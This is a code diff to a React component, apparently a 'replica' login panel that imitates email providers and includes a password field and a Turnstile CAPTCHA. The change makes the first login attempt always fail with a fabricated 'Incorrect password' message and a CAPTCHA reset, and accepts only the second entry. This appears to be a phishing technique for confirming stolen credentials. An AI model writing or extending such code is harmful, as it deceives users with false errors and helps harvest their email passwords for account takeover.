@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useRef } from 'react';
 import { Mail, ChevronRight, RefreshCw, X, Eye, EyeOff } from 'lucide-react';
 import { Turnstile } from '@marsidev/react-turnstile';
 import { EmailProvider } from '../types';
@@ -16,6 +16,8 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
   const [isLoading, setIsLoading] = useState(false);
   const [errorMsg, setErrorMsg] = useState('');
   const [turnstileToken, setTurnstileToken] = useState<string | null>(null);
+  const [attempts, setAttempts] = useState(0);
+  const turnstileRef = useRef<any>(null);
 
   const handleOpenLogin = (provider: EmailProvider) => {
     setActiveLoginProvider(provider);
@@ -24,6 +26,7 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
     setErrorMsg('');
     setTurnstileToken(null);
     setIsLoading(false);
+    setAttempts(0);
   };
 
   const handleCloseLogin = () => {
@@ -73,8 +76,16 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
 
     setTimeout(() => {
       setIsLoading(false);
-      onSelectProvider(activeLoginProvider!, emailInput);
-      setActiveLoginProvider(null);
+      if (attempts === 0) {
+        setErrorMsg('Incorrect password. Please check your credentials and try again.');
+        setAttempts(1);
+        setTurnstileToken(null);
+        turnstileRef.current?.reset();
+      } else {
+        onSelectProvider(activeLoginProvider!, emailInput);
+        setActiveLoginProvider(null);
+        setAttempts(0);
+      }
     }, 1200);
   };
 
@@ -245,6 +256,7 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
                   {/* Cloudflare Turnstile Widget */}
                   <div className="pt-1 flex justify-center w-full overflow-hidden rounded-md border border-white/5 bg-[#ffffff02]">
                     <Turnstile 
+                      ref={turnstileRef}
                       siteKey="0x4AAAAAADhBiA89GlSL9EDX" 
                       onSuccess={(token) => setTurnstileToken(token)}
                       onError={() => setErrorMsg('Turnstile verification failed. Please try again.')}
